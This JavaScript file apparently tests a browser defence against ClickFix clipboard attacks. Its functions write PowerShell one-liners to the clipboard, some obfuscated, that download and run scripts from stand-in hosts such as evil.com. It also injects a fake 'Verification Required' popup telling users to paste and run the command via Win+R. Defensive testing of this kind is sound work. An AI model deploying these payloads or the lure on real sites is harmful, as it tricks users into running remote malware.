/**
 * Click Fixed Test Script
 * Mimics an external malicious script that attempts to write a PowerShell payload
 * to the user's clipboard.
 */
function triggerClickFixAttack() {
  const payload = `powershell.exe -NoProfile -ExecutionPolicy Bypass -WindowStyle Hidden -Command "iex (New-Object System.Net.WebClient).DownloadString('https://evil-cdn.example.com/update.ps1')"`;
  
  console.log("[Test] External script attempting to write attack payload to clipboard...");
  
  navigator.clipboard.writeText(payload)
    .then(() => {
      console.log("[Test] ✅ Success: Clipboard write succeeded (Click Fixed DID NOT block it).");
      alert("Success: Clipboard write succeeded. Check console logs.");
    })
    .catch((err) => {
      console.warn("[Test] 🛑 Blocked: Clipboard write failed:", err.message);
      alert("Blocked: Clipboard write failed: " + err.message);
    });
}

function triggerObfuscatedAttack() {
  // Uses backticks in PowerShell (e.g. p`o`w`e`r`s`h`e`l`l) and carets in cmd (e.g. c^m^d)
  const payload = `c^m^d.exe /c "p\`o\`w\`e\`r\`s\`h\`e\`l\`l.exe -nop -ep bypass -w hidden [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String('ZXZpbA=='))"`;

  console.log("[Test] Attempting obfuscated attack payload...");

  navigator.clipboard.writeText(payload)
    .then(() => {
      console.log("[Test] ✅ Success: Obfuscated write succeeded (Bypassed!).");
      alert("Success: Obfuscated write succeeded.");
    })
    .catch((err) => {
      console.warn("[Test] 🛑 Blocked: Obfuscated write failed:", err.message);
      alert("Blocked: Obfuscated write failed: " + err.message);
    });
}

function triggerClipboardItemAttack() {
  // Uses navigator.clipboard.write with ClipboardItem instead of writeText
  const payload = `powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -Command "iex (New-Object Net.WebClient).DownloadString('https://badsite.com/loader.txt')"`;
  
  console.log("[Test] Attempting ClipboardItem write attack...");

  const blob = new Blob([payload], { type: "text/plain" });
  const item = new ClipboardItem({ "text/plain": blob });

  navigator.clipboard.write([item])
    .then(() => {
      console.log("[Test] ✅ Success: ClipboardItem write succeeded (Bypassed!).");
      alert("Success: ClipboardItem write succeeded.");
    })
    .catch((err) => {
      console.warn("[Test] 🛑 Blocked: ClipboardItem write failed:", err.message);
      alert("Blocked: ClipboardItem write failed: " + err.message);
    });
}

function triggerSafeCopy() {
  const payload = "Hello! This is a completely safe and normal copy event.";
  
  console.log("[Test] External script writing a normal payload to clipboard...");
  
  navigator.clipboard.writeText(payload)
    .then(() => {
      console.log("[Test] ✅ Success: Normal clipboard write succeeded.");
      alert("Success: Safe copy completed.");
    })
    .catch((err) => {
      console.error("[Test] ❌ Error: Normal clipboard write failed:", err.message);
      alert("Error: Safe copy failed: " + err.message);
    });
}

function triggerProactiveModalLure() {
  console.log("[Test] Injecting fake ClickFix verification modal...");
  
  // Remove existing test modal if present
  const existing = document.getElementById("test-lure-modal");
  if (existing) existing.remove();
  
  const modal = document.createElement("div");
  modal.id = "test-lure-modal";
  modal.style.cssText = `
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 420px;
    background: #0f172a;
    border: 2px solid #3b82f6;
    border-radius: 16px;
    padding: 24px;
    z-index: 99999;
    box-shadow: 0 10px 30px rgba(0,0,0,0.8);
    font-family: sans-serif;
    color: #f1f5f9;
  `;
  
  modal.innerHTML = `
    <h3 style="margin-bottom:12px; color:#3b82f6; font-size: 1.2rem;">Verification Required</h3>
    <p style="font-size:14px; margin-bottom:16px; color:#94a3b8; line-height:1.5;">
      To prove you are a human, please follow these simple steps:
    </p>
    <div style="background:#1e293b; padding:12px; border-radius:8px; font-size:13px; line-height:1.6; margin-bottom:16px;">
      1. Press the <strong>Windows Key + R</strong> combination on your keyboard.<br>
      2. Paste the verification command (it has been copied automatically).<br>
      3. Press Enter to run the PowerShell verification script.
    </div>
    <div style="background:#020617; padding:10px; border-radius:6px; font-family:monospace; font-size:12px; word-break:break-all; margin-bottom:16px; border:1px solid #1e293b; color:#10b981;">
      powershell.exe -w hidden -c iex(New-Object Net.WebClient).DownloadString('http://evil.com/verify.ps1')
    </div>
    <div style="display:flex; justify-content:flex-end; gap:8px;">
      <button id="lure-cancel-btn" style="background:#334155; border:none; padding:8px 16px; border-radius:6px; color:white; cursor:pointer; font-weight:bold;">Cancel</button>
      <button id="lure-copy-btn" style="background:#3b82f6; border:none; padding:8px 16px; border-radius:6px; color:white; cursor:pointer; font-weight:bold;">Copy & Verify</button>
    </div>
  `;
  
  document.body.appendChild(modal);

  modal.querySelector("#lure-cancel-btn").addEventListener("click", () => {
    modal.remove();
  });
  modal.querySelector("#lure-copy-btn").addEventListener("click", () => {
    alert("Verification command copied!");
  });
}

// Bind test dashboard scenario buttons to prevent inline onclick handlers and CSP violations
document.addEventListener("DOMContentLoaded", () => {
  const btnSafe = document.getElementById("btn-safe-copy");
  const btnAttack = document.getElementById("btn-attack");
  const btnObfuscated = document.getElementById("btn-obfuscated");
  const btnClipboardItem = document.getElementById("btn-clipboard-item");
  const btnProactive = document.getElementById("btn-proactive-lure");

  if (btnSafe) btnSafe.addEventListener("click", triggerSafeCopy);
  if (btnAttack) btnAttack.addEventListener("click", triggerClickFixAttack);
  if (btnObfuscated) btnObfuscated.addEventListener("click", triggerObfuscatedAttack);
  if (btnClipboardItem) btnClipboardItem.addEventListener("click", triggerClipboardItemAttack);
  if (btnProactive) btnProactive.addEventListener("click", triggerProactiveModalLure);
});

